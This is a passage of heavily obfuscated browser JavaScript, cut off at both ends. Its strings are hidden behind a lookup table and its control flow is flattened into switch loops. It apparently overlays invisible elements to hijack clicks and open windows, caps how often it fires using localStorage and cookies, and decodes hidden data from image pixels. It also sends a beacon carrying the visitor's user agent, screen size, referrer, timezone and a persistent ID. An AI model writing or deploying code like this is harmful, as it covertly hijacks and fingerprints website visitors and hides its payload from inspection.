i(e[$.CA](r,t,arguments),v);},o[$.Bi]=o[$.Bj]=function(n){n&&n[$.bE]();},i[$.CG][$.bD]=i[$.CG][$.cq]=function(){},i[$.CG][$.bE]=function(){this[$.bw][$.CA](t,this[$.bv]);},o[$.ah]=function(n,t){u(n[$.dB]),n[$.cs]=t;},o[$.ai]=function(n){u(n[$.dB]),n[$.cs]=-$.x;},o[$.aj]=o[$.bt]=function(n){for($._Ce=$.BD;$._Ce<$.Cg;$._Ce+=$.x){switch($._Ce){case $.CC:$.BD<=t&&(n[$.dB]=q(function(){n[$.fJ]&&n[$.fJ]();},t));break;case $.x:var t=n[$.cs];break;case $.BD:u(n[$.dB]);break;}}},c($.aJ),o[$.ak]=$.Ct!=typeof self&&self[$.ak]||void $.BD!==n&&n[$.ak]||this&&this[$.ak],o[$.al]=$.Ct!=typeof self&&self[$.al]||void $.BD!==n&&n[$.al]||this&&this[$.al];break;case $.x:function i(n,t){this[$.bv]=n,this[$.bw]=t;}break;case $.BD:var t=void $.BD!==n&&n||$.Ct!=typeof self&&self||window,e=Function[$.CG][$.Ch];break;}}}[$.CA](o,c($.gC)));},function(n,t,r){(function(n,m){!function(r,e){for($._Fe=$.BD;$._Fe<$.DD;$._Fe+=$.x){switch($._Fe){case $.Cg:function w(n){if(d)q(w,$.BD,n);else{for($._DA=$.BD;$._DA<$.CC;$._DA+=$.x){switch($._DA){case $.x:if(t){for($._Cz=$.BD;$._Cz<$.CC;$._Cz+=$.x){switch($._Cz){case $.x:try{!function(n){for($._CF=$.BD;$._CF<$.CC;$._CF+=$.x){switch($._CF){case $.x:switch(r[$.Hc]){case $.BD:t();break;case $.x:t(r[$.BD]);break;case $.CC:t(r[$.BD],r[$.x]);break;case $.Cg:t(r[$.BD],r[$.x],r[$.CC]);break;default:t[$.Ch](e,r);}break;case $.BD:var t=n[$.el],r=n[$.em];break;}}}(t);}finally{l(n),d=!$.x;}break;case $.BD:d=!$.BD;break;}}}break;case $.BD:var t=a[n];break;}}}}break;case $.x:if(!r[$.ak]){for($._Fd=$.BD;$._Fd<$.CC;$._Fd+=$.x){switch($._Fd){case $.x:v=v&&v[$.Bf]?v:r,$.cu===$.$()[$.Bw][$.CA](r[$.eI])?u=function(n){m[$.Ej](function(){w(n);});}:!function(){if(r[$.aA]&&!r[$.gF]){for($._Dt=$.BD;$._Dt<$.CC;$._Dt+=$.x){switch($._Dt){case $.x:return r[$.ga]=function(){n=!$.x;},r[$.aA]($.Bv,$.aq),r[$.ga]=t,n;break;case $.BD:var n=!$.BD,t=r[$.ga];break;}}}}()?r[$.Bk]?((t=new x())[$.gi][$.ga]=function(n){w(n[$.bm]);},u=function(n){t[$.gj][$.aA](n);}):s&&$.go in s[$.A]($.ba)?(i=s[$.bF],u=function(n){for($._Fa=$.BD;$._Fa<$.CC;$._Fa+=$.x){switch($._Fa){case $.x:t[$.go]=function(){w(n),t[$.go]=null,i[$.bl](t),t=null;},i[$.Bt](t);break;case $.BD:var t=s[$.A]($.ba);break;}}}):u=function(n){q(w,$.BD,n);}:(o=$.gr+f[$.Bn]()+$.gt,n=function(n){n[$.gs]===r&&$.gu==typeof n[$.bm]&&$.BD===n[$.bm][$.ap](o)&&w(+n[$.bm][$.CB](o[$.Hc]));},r[$.B]?r[$.B]($.HJ,n,!$.x):r[$.ge]($.ga,n),u=function(n){r[$.aA](o+n,$.aq);}),v[$.ak]=function(n){for($._Cw=$.BD;$._Cw<$.DD;$._Cw+=$.x){switch($._Cw){case $.Cg:return a[c]=e,u(c),c++;break;case $.x:for(var t=new h(arguments[$.Hc]-$.x),r=$.BD;r<t[$.Hc];r++)t[r]=arguments[r+$.x];break;case $.CC:var e=$.$($.el,n,$.em,t);break;case $.BD:$.Fv!=typeof n&&(n=new Function($.Bv+n));break;}}},v[$.al]=l;break;case $.BD:var u,i,t,o,n,c=$.x,a=$.$(),d=!$.x,s=r[$.y],v=Object[$.df]&&Object[$.df](r);break;}}}break;case $.CC:function l(n){delete a[n];}break;case $.BD:$.Cs;break;}}}($.Ct==typeof self?void $.BD===n?this:n:self);}[$.CA](t,r($.gC),r($.gv)));},function(n,t){for($._Cy=$.BD;$._Cy<$.GD;$._Cy+=$.x){switch($._Cy){case $.GE:function y(){}break;case $.DD:!function(){for($._BF=$.BD;$._BF<$.CC;$._BF+=$.x){switch($._BF){case $.x:try{e=$.Fv==typeof u?u:c;}catch(n){e=c;}break;case $.BD:try{r=$.Fv==typeof q?q:o;}catch(n){r=o;}break;}}}();break;case $.GB:function w(){if(!s){for($._Cr=$.BD;$._Cr<$.DD;$._Cr+=$.x){switch($._Cr){case $.Cg:a=null,s=!$.x,function(t){for($._Cf=$.BD;$._Cf<$.Cg;$._Cf+=$.x){switch($._Cf){case $.CC:try{e(t);}catch(n){try{return e[$.CA](null,t);}catch(n){return e[$.CA](this,t);}}break;case $.x:if((e===c||!e)&&u)return(e=u)(t);break;case $.BD:if(e===u)return u(t);break;}}}(n);break;case $.x:s=!$.BD;break;case $.CC:for(var t=d[$.Hc];t;){for($._CI=$.BD;$._CI<$.CC;$._CI+=$.x){switch($._CI){case $.x:v=-$.x,t=d[$.Hc];break;case $.BD:for(a=d,d=[];++v<t;)a&&a[v][$.Hg]();break;}}}break;case $.BD:var n=f(l);break;}}}}break;case $.Cg:function f(t){for($._By=$.BD;$._By<$.Cg;$._By+=$.x){switch($._By){case $.CC:try{return r(t,$.BD);}catch(n){try{return r[$.CA](null,t,$.BD);}catch(n){return r[$.CA](this,t,$.BD);}}break;case $.x:if((r===o||!r)&&q)return(r=q)(t,$.BD);break;case $.BD:if(r===q)return q(t,$.BD);break;}}}break;case $.Gb:function m(n,t){this[$.af]=n,this[$.ag]=t;}break;case $.GJ:var a,d=[],s=!$.x,v=-$.x;break;case $.CC:function c(){throw new Error($.Hm);}break;case $.x:function o(){throw new Error($.Hl);}break;case $.Gc:i[$.Ej]=function(n){for($._CD=$.BD;$._CD<$.Cg;$._CD+=$.x){switch($._CD){case $.CC:d[$.bg](new m(n,t)),$.x!==d[$.Hc]||s||f(w);break;case $.x:if($.x<arguments[$.Hc])for(var r=$.x;r<arguments[$.Hc];r++)t[r-$.x]=arguments[r];break;case $.BD:var t=new h(arguments[$.Hc]-$.x);break;}}},m[$.CG][$.Hg]=function(){this[$.af][$.Ch](null,this[$.ag]);},i[$.Ek]=$.El,i[$.El]=!$.BD,i[$.Em]=$.$(),i[$.En]=[],i[$.Eo]=$.Bv,i[$.Ep]=$.$(),i.on=y,i[$.Eq]=y,i[$.Er]=y,i[$.Es]=y,i[$.Et]=y,i[$.Eu]=y,i[$.Ev]=y,i[$.Ew]=y,i[$.Ex]=y,i[$.Ey]=function(n){return[];},i[$.Ez]=function(n){throw new Error($.bb);},i[$.FA]=function(){return $.aE;},i[$.FB]=function(n){throw new Error($.bc);},i[$.FC]=function(){return $.BD;};break;case $.GH:function l(){s&&a&&(s=!$.x,a[$.Hc]?d=a[$.bo](d):v=-$.x,d[$.Hc]&&w());}break;case $.BD:var r,e,i=n[$.Bx]=$.$();break;}}},function(n,t,r){for($._Dw=$.BD;$._Dw<$.DD;$._Dw+=$.x){switch($._Dw){case $.Cg:function d(n,t){try{for($._Bf=$.BD;$._Bf<$.CC;$._Bf+=$.x){switch($._Bf){case $.x:return n[$.ap](r)+o;break;case $.BD:var r=n[$.bf](function(n){return-$.x<n[$.ap](t);})[$.dj]();break;}}}catch(n){return $.BD;}}break;case $.x:Object[$.e](t,$.Cd,$.$($.Jf,!$.BD)),t.qn=function(n){for($._i=$.BD;$._i<$.CC;$._i+=$.x){switch($._i){case $.x:return $.x;break;case $.BD:{for($._g=$.BD;$._g<$.CC;$._g+=$.x){switch($._g){case $.x:if(i[$.Je](n))return $.CC;break;case $.BD:if(u[$.Je](n))return $.Cg;break;}}}break;}}},t.Pn=function(n){return d(c,n);},t.En=function(n){return d(f,n[$.ch]());},t.Tn=function(n){return d(a,n);},t.Mn=function(n){return n[$.Hk]($.aE)[$.CB]($.x)[$.bf](function(n){return n;})[$.dj]()[$.Hk]($.cr)[$.CB](-$.CC)[$.Bu]($.cr)[$.fI]()[$.Hk]($.Bv)[$.cl](function(n,t){return n+($.BD,e[$.Dt])(t);},$.BD)%$.GH+$.x;};break;case $.CC:var e=r($.Cg),u=new j($.Gn,$.CD),i=new j($.Go,$.CD),o=$.CC,c=[[$.FD],[$.FE,$.FF,$.FG],[$.FH,$.FI],[$.FJ,$.Fa,$.Fb],[$.Fc,$.Fd]],f=[[$.Fe],[-$.Fw],[-$.Fx],[-$.Fy,-$.Fz],[$.Ff,$.FG,-$.Fe,-$.GA]],a=[[$.Fg],[$.Fh],[$.Fi],[$.Fj],[$.Fk]];break;case $.BD:$.Cs;break;}}},function(n,t,r){for($._o=$.BD;$._o<$.GH;$._o+=$.x){switch($._o){case $.GJ:f[$.Fm]=($.BD,i.Xn)(o.C,d),a[$.Fm]=o.I,window[$.B]($.HJ,($.BD,i.Ln)(f,e.Sn,u.Z)),window[$.B]($.HJ,($.BD,i.Ln)(a,e.Sn,$.x));break;case $.CC:var e=r($.DD),u=r($.x),i=r($.Gb),o=r($.BD),c=t.nn=$.$(),f=t[$.Hb]=$.$(),a=t[$.Fl]=$.$();break;case $.Cg:c[$.Fm]=o.N,window[$.B]($.HJ,($.BD,i.Ln)(c,e.Sn,$.x));break;case $.x:Object[$.e](t,$.Cd,$.$($.Jf,!$.BD)),t[$.Fl]=t[$.Hb]=t.nn=void $.BD;break;case $.DD:var d=c[$.Hc]*u.Z;break;case $.BD:$.Cs;break;}}},function(n,t,r){for($._EA=$.BD;$._EA<$.GJ;$._EA+=$.x){switch($._EA){case $.Cg:var a=void $.BD,d=void $.BD,s=!$.x,v=!$.x,l=b(c.S),w=[$.Dn,$.Do,$.Dp,$.Dq,$.Dr];break;case $.x:Object[$.e](t,$.Cd,$.$($.Jf,!$.BD)),t.Bt=function(r){for($._Du=$.BD;$._Du<$.Cg;$._Du+=$.x){switch($._Du){case $.CC:var n,t,e;break;case $.x:v=r===c.e,(a=document[$.A]($.Js))[$.l][$.dn]=$.dt,n=a,t=d=function(n){if(!s){for($._Dj=$.BD;$._Dj<$.Cg;$._Dj+=$.x){switch($._Dj){case $.CC:t&&r===c.a?($.BD,u[$.Fo])(r):t&&r===c.e&&q(function(){t[$.gD]||($.BD,u[$.Fo])(r);},$.JA);break;case $.x:var t=($.BD,o[$.Cj])($.Hf+l+$.fe+r+$.fh);break;case $.BD:n[$.eJ](),n[$.ea](),h();break;}}}},e=!f[$.Ft]&&f[$.Hn]<$.dp,n[$.B]?(f[$.Ho]||(f[$.Hn]&&!f[$.Fq]?n[$.B]($.Dn,t,!$.BD):!f[$.Fs]&&!f[$.Fr]||f[$.Fq]?(n[$.B]($.Do,t,!$.BD),n[$.B]($.Dp,t,!$.BD)):n[$.B]($.Do,t,!$.BD)),e?f[$.Ho]?n[$.B]($.Dq,t,!$.BD):n[$.B]($.Dr,t,!$.BD):f[$.Ho]&&n[$.B]($.Do,t,!$.BD)):document[$.ge]&&n[$.ge]($.HD,t),document[$.bF][$.Bt](a),s=!$.x;break;case $.BD:if(!($.BD,u[$.Fn])(r)||v)return;break;}}},t.It=h,t.Tt=function(){return void $.BD===d;},t.Nt=function(n){l=n;};break;case $.DD:function h(){for($._Bd=$.BD;$._Bd<$.CC;$._Bd+=$.x){switch($._Bd){case $.x:s=!$.BD;break;case $.BD:try{w[$.k](function(n){window[$.C](n,d,!$.BD),window[$.C](n,d,!$.x);}),a&&document[$.bF][$.bl](a),d=void $.BD;}catch(n){}break;}}}break;case $.CC:var e,u=r($.Gp),i=r($.Gq),o=(e=i)&&e[$.Cd]?e:$.$($.Cj,e),c=r($.BD),f=r($.Gr);break;case $.BD:$.Cs;break;}}},function(n,r,u){for($._Ey=$.BD;$._Ey<$.Gb;$._Ey+=$.x){switch($._Ey){case $.GB:window[c]||(window[c]=$.$());break;case $.Cg:r.Ct=function(){for($._Bi=$.BD;$._Bi<$.GJ;$._Bi+=$.x){switch($._Bi){case $.Cg:if(o&&c)return!$.BD;break;case $.x:if(r+v<new e()[$.cf]())return _(new e()[$.cf](),$.BD,$.BD),$.BD<d.v;break;case $.DD:return!$.x;break;case $.CC:var o=i<d.v,c=u+l<new e()[$.cf]();break;case $.BD:var n=y(),t=f(n,$.Cg),r=t[$.BD],u=t[$.x],i=t[$.CC];break;}}},r.zt=function(){for($._m=$.BD;$._m<$.CC;$._m+=$.x){switch($._m){case $.x:_(r,new e()[$.cf](),u+$.x);break;case $.BD:var n=y(),t=f(n,$.Cg),r=t[$.BD],u=t[$.CC];break;}}},r[$.Fn]=function(n){for($._BH=$.BD;$._BH<$.CC;$._BH+=$.x){switch($._BH){case $.x:return!$.BD;break;case $.BD:try{for($._z=$.BD;$._z<$.CC;$._z+=$.x){switch($._z){case $.x:if(u)return new e()[$.cf]()>m(u,$.Gc);break;case $.BD:var r=$.Bv+o+n,u=w[r]||t[r];break;}}}catch(n){}break;}}},r[$.Fo]=function(n){for($._t=$.BD;$._t<$.DD;$._t+=$.x){switch($._t){case $.Cg:try{w[u]=r;}catch(n){}break;case $.x:window[c][n]=!$.BD;break;case $.CC:try{t[u]=r;}catch(n){}break;case $.BD:var r=new e()[$.cf]()+$.DI,u=$.Bv+o+n;break;}}};break;case $.GJ:function y(){for($._u=$.BD;$._u<$.GJ;$._u+=$.x){switch($._u){case $.Cg:var r=n[$.Hk](a.X),u=f(r,$.Cg),i=u[$.BD],o=u[$.x],c=u[$.CC];break;case $.x:try{n=t[s]||$.Bv;}catch(n){}break;case $.DD:return[m(i,$.Gc)||new e()[$.cf](),m(c,$.Gc)||$.BD,m(o,$.Gc)||$.BD];break;case $.CC:try{n||(n=w[s]||$.Bv);}catch(n){}break;case $.BD:var n=void $.BD;break;}}}break;case $.CC:var f=function(n,t){for($._Es=$.BD;$._Es<$.Cg;$._Es+=$.x){switch($._Es){case $.CC:throw new TypeError($.ac);break;case $.x:if(Symbol[$.an]in Object(n))return function(n,t){for($._En=$.BD;$._En<$.Cg;$._En+=$.x){switch($._En){case $.CC:return r;break;case $.x:try{for(var o,c=n[Symbol[$.an]]();!(e=(o=c[$.fp]())[$.fu])&&(r[$.bg](o[$.Jf]),!t||r[$.Hc]!==t);e=!$.BD);}catch(n){u=!$.BD,i=n;}finally{try{!e&&c[$.gg]&&c[$.gg]();}finally{if(u)throw i;}}break;case $.BD:var r=[],e=!$.BD,u=!$.x,i=void $.BD;break;}}}(n,t);break;case $.BD:if(h[$.Jy](n))return n;break;}}};break;case $.x:Object[$.e](r,$.Cd,$.$($.Jf,!$.BD));break;case $.GH:function _(n,r,e){for($._n=$.BD;$._n<$.Cg;$._n+=$.x){switch($._n){case $.CC:try{w[s]=u;}catch(n){}break;case $.x:try{t[s]=u;}catch(n){}break;case $.BD:var u=[n,e,r][$.Bu](a.X);break;}}}break;case $.DD:var i=u($.Gs),a=u($.x),d=u($.BD),o=$.DJ,s=$.Fp+d.e+$.az,c=$.Da,v=d.w*i.Rt,l=d.h*i.Dt;break;case $.BD:$.Cs;break;}}},function(n,t,r){for($._H=$.BD;$._H<$.Cg;$._H+=$.x){switch($._H){case $.CC:t.Dt=$.JA,t.Rt=$.JB;break;case $.x:Object[$.e](t,$.Cd,$.$($.Jf,!$.BD));break;case $.BD:$.Cs;break;}}},function(t,r,e){for($._y=$.BD;$._y<$.DD;$._y+=$.x){switch($._y){case $.Cg:r[$.Fq]=c||f,r[$.Fr]=new RegExp($.Id,$.Bv)[$.Je](u),r[$.Fs]=new RegExp($.Ie,$.If)[$.Je](u),r[$.Ft]=new RegExp($.Jk,$.CD)[$.Je](u)&&new RegExp($.bu,$.CD)[$.Je](u);break;case $.x:Object[$.e](r,$.Cd,$.$($.Jf,!$.BD));break;case $.CC:var u=n[$.Gt],i=u[$.Hh](new RegExp($.aB,$.Bv))||[],o=u[$.Hh](new RegExp($.aC,$.Bv))||[],c=(r[$.Hn]=m(i[$.x],$.Gc)||m(o[$.x],$.Gc),r[$.Ho]=new RegExp($.am,$.Bv)[$.Je](u)),f=r[$.Hd]=new RegExp($.Gn,$.CD)[$.Je](u);break;case $.BD:$.Cs;break;}}},function(n,t,r){for($._Ee=$.BD;$._Ee<$.GJ;$._Ee+=$.x){switch($._Ee){case $.Cg:function i(n){for($._Eb=$.BD;$._Eb<$.CC;$._Eb+=$.x){switch($._Eb){case $.x:i!==l&&i!==w||(t===h?(d[$.dD]=m,d[$.ec]=v.O,d[$.dH]=v.e,d[$.ed]=v.a):t!==_||!o||f&&!a||(d[$.dD]=b,d[$.dF]=o,($.BD,s.Ot)(r,c,u,e)[$.cp](function(n){for($._Di=$.BD;$._Di<$.CC;$._Di+=$.x){switch($._Di){case $.x:t[$.dD]=g,t[$.dC]=r,t[$.dF]=o,t[$.bm]=n,j(i,t);break;case $.BD:var t=$.$();break;}}})[$.fa](function(n){for($._EF=$.BD;$._EF<$.CC;$._EF+=$.x){switch($._EF){case $.x:t[$.dD]=p,t[$.dC]=r,t[$.dF]=o,t[$.dI]=n&&n[$.HJ],j(i,t);break;case $.BD:var t=$.$();break;}}})),d[$.dD]&&j(i,d));break;case $.BD:var r=n&&n[$.bm]&&n[$.bm][$.dC],t=n&&n[$.bm]&&n[$.bm][$.dD],e=n&&n[$.bm]&&n[$.bm][$.c],u=n&&n[$.bm]&&n[$.bm][$.dE],i=n&&n[$.bm]&&n[$.bm][$.aD],o=n&&n[$.bm]&&n[$.bm][$.dF],c=n&&n[$.bm]&&n[$.bm][$.dG],f=n&&n[$.bm]&&n[$.bm][$.dH],a=f===v.e||f===v.a,d=$.$();break;}}}break;case $.x:Object[$.e](t,$.Cd,$.$($.Jf,!$.BD)),t[$.Cj]=function(){for($._BG=$.BD;$._BG<$.CC;$._BG+=$.x){switch($._BG){case $.x:window[$.B]($.HJ,i);break;case $.BD:try{(e=new y(l))[$.B]($.HJ,i),(u=new y(w))[$.B]($.HJ,i);}catch(n){}break;}}};break;case $.DD:function j(n,t){for($._s=$.BD;$._s<$.CC;$._s+=$.x){switch($._s){case $.x:window[$.aA](t,$.aq);break;case $.BD:switch(t[$.aD]=n){case w:u[$.aA](t);break;case l:default:e[$.aA](t);}break;}}}break;case $.CC:var s=r($.Gm),v=r($.BD),l=$.Db,w=$.Dc,h=$.Dd,m=$.De,_=$.Df,b=$.Dg,p=$.Dh,g=$.Di,e=void $.BD,u=void $.BD;break;case $.BD:$.Cs;break;}}},function(n,t,r){for($._FC=$.BD;$._FC<$.GB;$._FC+=$.x){switch($._FC){case $.GJ:function A(n){return z(b(n)[$.Hk]($.Bv)[$.bJ](function(n){return $.dx+($.Hx+n[$.cE]($.BD)[$.Bw]($.GF))[$.CB](-$.CC);})[$.Bu]($.Bv));}break;case $.CC:var j=$.Fv==typeof Symbol&&$.ax==typeof Symbol[$.an]?function(n){return typeof n;}:function(n){return n&&$.Fv==typeof Symbol&&n[$.fr]===Symbol&&n!==Symbol[$.CG]?$.ax:typeof n;};break;case $.Cg:t.kt=function(n,o){return new v[$.Cj](function(e,u){for($._Ek=$.BD;$._Ek<$.CC;$._Ek+=$.x){switch($._Ek){case $.x:i[$.cz]=n,i[$.dg]=O.Ht,i[$.dD]=O.Lt,i[$.dh]=O.Gt,document[$.Co][$.dq](i,document[$.Co][$.Cf]),i[$.aa]=function(){for($._Ef=$.BD;$._Ef<$.CC;$._Ef+=$.x){switch($._Ef){case $.x:var t,r;break;case $.BD:try{for($._EG=$.BD;$._EG<$.CC;$._EG+=$.x){switch($._EG){case $.x:i[$.Ck][$.bl](i),o===S.zn?e(x(n)):e(A(n));break;case $.BD:var n=(t=i[$.cz],((r=h[$.CG][$.CB][$.CA](document[$.fs])[$.bf](function(n){return n[$.cz]===t;})[$.bs]()[$.gI])[$.BD][$.gJ][$.fx]($.gb)?r[$.BD][$.l][$.gf]:r[$.CC][$.l][$.gf])[$.CB]($.x,-$.x));break;}}}catch(n){u();}break;}}},i[$.Ha]=function(){i[$.Ck][$.bl](i),u();};break;case $.BD:var i=document[$.A](O.Ft);break;}}});},t.xt=function(t,w){return new v[$.Cj](function(v,n){for($._FA=$.BD;$._FA<$.CC;$._FA+=$.x){switch($._FA){case $.x:l[$.dh]=$.dm,l[$.i]=t,l[$.aa]=function(){for($._Eu=$.BD;$._Eu<$.GB;$._Eu+=$.x){switch($._Eu){case $.GJ:var d=c(i[$.Bu]($.Bv)[$.fd]($.BD,u)),s=w===S.zn?x(d):A(d);break;case $.CC:var t=n[$.eu]($.ey);break;case $.Cg:t[$.eg](l,$.BD,$.BD);break;case $.x:n[$.q]=l[$.q],n[$.r]=l[$.r];break;case $.GH:return v(s);break;case $.DD:for(var r=t[$.ev]($.BD,$.BD,l[$.q],l[$.r]),e=r[$.bm],u=e[$.CB]($.BD,$.Gd)[$.bf](function(n,t){return(t+$.x)%$.DD;})[$.au]()[$.cl](function(n,t,r){return n+t*f[$.fb]($.gH,r);},$.BD),i=[],o=$.Gd;o<e[$.Hc];o++)if((o+$.x)%$.DD){for($._Ep=$.BD;$._Ep<$.CC;$._Ep+=$.x){switch($._Ep){case $.x:(w===S.zn||$.Jl<=a)&&i[$.bg](k[$.n](a));break;case $.BD:var a=e[o];break;}}}break;case $.BD:var n=document[$.A]($.ex);break;}}},l[$.Ha]=function(){return n();};break;case $.BD:var l=new Image();break;}}});},t.qt=function(u,i){for($._Eh=$.BD;$._Eh<$.CC;$._Eh+=$.x){switch($._Eh){case $.x:return new v[$.Cj](function(t,r){for($._Ea=$.BD;$._Ea<$.CC;$._Ea+=$.x){switch($._Ea){case $.x:if(e[$.aF](a,u),e[$.dG]=f,e[$.dd]=!$.BD,e[$.aG](S.Bn,c(o(i))),e[$.aa]=function(){for($._DF=$.BD;$._DF<$.CC;$._DF+=$.x){switch($._DF){case $.x:n[$.cj]=e[$.cj],n[$.Di]=f===S.Cn?g[$.fg](e[$.Di]):e[$.Di],$.BD<=[$.bn,$.en][$.ap](e[$.cj])?t(n):r(new Error($.fB+e[$.cj]+$.dr+e[$.fi]+$.fm+i));break;case $.BD:var n=$.$();break;}}},e[$.Ha]=function(){r(new Error($.fB+e[$.cj]+$.dr+e[$.fi]+$.fm+i));},a===S.Dn){for($._EH=$.BD;$._EH<$.CC;$._EH+=$.x){switch($._EH){case $.x:e[$.aG](S.vn,S.In),e[$.aH](n);break;case $.BD:var n=$.eb===(void $.BD===d?$.Ct:j(d))?g[$.fg](d):d;break;}}}else e[$.aH]();break;case $.BD:var e=new window[$.aw]();break;}}});break;case $.BD:var f=$.CC<arguments[$.Hc]&&void $.BD!==arguments[$.CC]?arguments[$.CC]:S.Cn,a=$.Cg<arguments[$.Hc]&&void $.BD!==arguments[$.Cg]?arguments[$.Cg]:S.Rn,d=$.DD<arguments[$.Hc]&&void $.BD!==arguments[$.DD]?arguments[$.DD]:$.$();break;}}},t.Pt=function(t,m){for($._Ej=$.BD;$._Ej<$.CC;$._Ej+=$.x){switch($._Ej){case $.x:return new v[$.Cj](function(f,a){for($._Eg=$.BD;$._Eg<$.Cg;$._Eg+=$.x){switch($._Eg){case $.CC:window[$.B]($.HJ,n),s[$.i]=t,(document[$.c]||document[$.bF])[$.Bt](s),w=q(h,O.Xt),l=q(h,O.Ut);break;case $.x:function n(n){for($._Ed=$.BD;$._Ed<$.CC;$._Ed+=$.x){switch($._Ed){case $.x:if(t===d)if(u(w),null===n[$.bm][t]){for($._DG=$.BD;$._DG<$.CC;$._DG+=$.x){switch($._DG){case $.x:r[t]=$.$($.fk,$.fn,$.dC,c(o(m)),$.dE,_,$.c,$.eb===(void $.BD===p?$.Ct:j(p))?g[$.fg](p):p),_===S.Dn&&(r[t][$.fy]=g[$.fg]($.$($.Io,S.In))),s[$.w][$.aA](r,$.aq);break;case $.BD:var r=$.$();break;}}}else{for($._EJ=$.BD;$._EJ<$.Cg;$._EJ+=$.x){switch($._EJ){case $.CC:e[$.cj]=i[$.gc],e[$.Di]=y===S.zn?x(i[$.c]):A(i[$.c]),$.BD<=[$.bn,$.en][$.ap](e[$.cj])?f(e):a(new Error($.fB+e[$.cj]+$.fm+m));break;case $.x:var e=$.$(),i=g[$.ar](b(n[$.bm][t]));break;case $.BD:v=!$.BD,h(),u(l);break;}}}break;case $.BD:var t=Object[$.eH](n[$.bm])[$.bs]();break;}}}break;case $.BD:var d=($.BD,i.vt)(t),s=($.BD,i.lt)(),v=!$.x,l=void $.BD,w=void $.BD,h=function(){try{s[$.Ck][$.bl](s),window[$.C]($.HJ,n),v||a(new Error($.ew));}catch(n){}};break;}}});break;case $.BD:var y=$.CC<arguments[$.Hc]&&void $.BD!==arguments[$.CC]?arguments[$.CC]:S.Cn,_=$.Cg<arguments[$.Hc]&&void $.BD!==arguments[$.Cg]?arguments[$.Cg]:S.Rn,p=$.DD<arguments[$.Hc]&&void $.BD!==arguments[$.DD]?arguments[$.DD]:$.$();break;}}};break;case $.x:Object[$.e](t,$.Cd,$.$($.Jf,!$.BD));break;case $.GH:function x(n){for($._BA=$.BD;$._BA<$.CC;$._BA+=$.x){switch($._BA){case $.x:return new p(t)[$.bJ](function(n,t){return r[$.cE](t);});break;case $.BD:var r=b(n),t=new s(r[$.Hc]);break;}}}break;case $.DD:var e,O=r($.Gu),S=r($.GH),i=r($.Ge),a=r($.GB),v=(e=a)&&e[$.Cd]?e:$.$($.Cj,e);break;case $.BD:$.Cs;break;}}},function(n,t,r){for($._c=$.BD;$._c<$.GH;$._c+=$.x){switch($._c){case $.GJ:u[$.l][$.Hi]=i,u[$.l][$.Hj]=o;break;case $.CC:t.Yt=$.JC,t.Ut=$.Ih,t.Xt=$.JD,t.Kt=$.JE,t.Zt=[$.Jm,$.Jn,$.Jo,$.Jp,$.Jq,$.Jr],t.Jt=$.JF,t.$t=$.BA;break;case $.Cg:var e=t.Qt=$.Js,u=t.Vt=document[$.A](e),i=t.Wt=$.ad,o=t.nr=$.ae;break;case $.x:Object[$.e](t,$.Cd,$.$($.Jf,!$.BD));break;case $.DD:t.tr=$.JG,t.rr=[$.Js,$.Jt,$.IH,$.Ju,$.Jd],t.er=[$.Jv,$.Jw,$.Jx],t.ur=$.Dn,t.ir=$.Dp,t.or=!$.BD,t.cr=!$.x,t.Ft=$.JH,t.Ht=$.JI,t.Gt=$.JJ,t.Lt=$.Ja;break;case $.BD:$.Cs;break;}}},function(r,u,i){for($._Ez=$.BD;$._Ez<$.Gb;$._Ez+=$.x){switch($._Ez){case $.GB:v.lr=$.Dl,v.wr=$.DG,v.hr=$.Jb,v.mr=$.Jc,v.yr=$.Jd,v._r=$.JF;break;case $.Cg:u.St=function(n,r){for($._v=$.BD;$._v<$.CC;$._v+=$.x){switch($._v){case $.x:t[f]=a+$.x,t[o]=new e()[$.cf](),t[c]=$.Bv;break;case $.BD:var u=T(n,r),i=S(u,$.Cg),o=i[$.BD],c=i[$.x],f=i[$.CC],a=m(t[f],$.Gc)||$.BD;break;}}},u.At=function(r,u,i){for($._Cv=$.BD;$._Cv<$.Cg;$._Cv+=$.x){switch($._Cv){case $.CC:var g,j,O,k;break;case $.x:if(t[a]&&!t[d]){for($._Cs=$.BD;$._Cs<$.DD;$._Cs+=$.x){switch($._Cs){case $.Cg:g=p,j=$.be+($.BD,P.$)()+$.fc,O=Object[$.eH](g)[$.bJ](function(n){for($._Cd=$.BD;$._Cd<$.CC;$._Cd+=$.x){switch($._Cd){case $.x:return[n,t][$.Bu]($.fo);break;case $.BD:var t=A(g[n]);break;}}})[$.Bu]($.gB),(k=new window[$.aw]())[$.aF]($.Iu,j,!$.BD),k[$.aG](q.vn,q.Fn),k[$.aH](O);break;case $.x:t[d]=w,t[s]=$.BD;break;case $.CC:var p=$.$($.dz,r,$.eA,_,$.eB,h,$.HH,i,$.eC,w,$.ft,function(){for($._CA=$.BD;$._CA<$.DD;$._CA+=$.x){switch($._CA){case $.Cg:return t[E]=r;break;case $.x:if(n)return n;break;case $.CC:var r=f[$.Bn]()[$.Bw]($.Bz)[$.CB]($.CC);break;case $.BD:var n=t[E];break;}}}(),$.eD,b,$.eE,l,$.eF,v,$.ee,n[$.Gt],$.es,window[$.cD][$.q],$.et,window[$.cD][$.r],$.dE,u||M,$.fA,new e()[$.ch](),$.fC,($.BD,x[$.Cj])(i),$.fD,($.BD,x[$.Cj])(_),$.fE,($.BD,x[$.Cj])(b),$.fF,n[$.dy]||n[$.er]);break;case $.BD:var v=m(t[s],$.Gc)||$.BD,l=m(t[a],$.Gc),w=new e()[$.cf](),h=w-l,y=document,_=y[$.eA],b=window[$.ct][$.cz];break;}}}break;case $.BD:var o=T(r,u),c=S(o,$.Cg),a=c[$.BD],d=c[$.x],s=c[$.CC];break;}}};break;case $.GJ:var E=$.Dj,a=$.Dk,d=$.Dl,s=$.DH,M=$.Dm,v=$.$();break;case $.CC:var S=function(n,t){for($._Et=$.BD;$._Et<$.Cg;$._Et+=$.x){switch($._Et){case $.CC:throw new TypeError($.ac);break;case $.x:if(Symbol[$.an]in Object(n))return function(n,t){for($._Eo=$.BD;$._Eo<$.Cg;$._Eo+=$.x){switch($._Eo){case $.CC:return r;break;case $.x:try{for(var o,c=n[Symbol[$.an]]();!(e=(o=c[$.fp]())[$.fu])&&(r[$.bg](o[$.Jf]),!t||r[$.Hc]!==t);e=!$.BD);}catch(n){u=!$.BD,i=n;}finally{try{!e&&c[$.gg]&&c[$.gg]();}finally{if(u)throw i;}}break;case $.BD:var r=[],e=!$.BD,u=!$.x,i=void $.BD;break;}}}(n,t);break;case $.BD:if(h[$.Jy](n))return n;break;}}};break;case $.x:Object[$.e](u,$.Cd,$.$($.Jf,!$.BD));break;case $.GH:function 